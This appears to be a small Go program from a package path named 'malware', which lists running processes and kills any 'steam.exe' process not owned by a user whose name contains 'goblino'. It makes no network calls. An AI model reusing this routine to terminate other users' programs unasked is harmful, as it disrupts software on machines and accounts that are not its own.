package main

import (
	"malware/processenum"
	"fmt"
	"strings"
)

func main() {
	processes := processenum.EnumerateProcesses()
	for _, proc := range processes {
		if proc.ProcessName == "steam.exe" && strings.Contains(proc.ProcessUser, "goblino") != true {
			//processenum.KillProcess(proc.ProcessIdentifier)
			fmt.Println("found proc. killing")
			processenum.KillProcess(proc.ProcessIdentifier)
		}
	}
}
